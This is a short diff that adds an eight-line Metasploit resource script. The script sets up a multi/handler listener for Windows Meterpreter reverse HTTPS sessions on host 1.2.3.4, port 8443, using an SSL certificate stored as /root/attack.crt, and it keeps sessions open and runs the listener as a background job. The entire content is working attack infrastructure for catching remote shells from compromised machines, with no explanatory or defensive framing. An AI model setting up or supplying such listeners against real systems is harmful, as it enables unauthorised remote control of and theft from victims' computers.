@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set stagerverifysslcert true
+set HANDLERSSLCERT /root/attack.crt
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 1.2.3.4
+set LPORT 8443
+set ExitOnSession false
+exploit -j
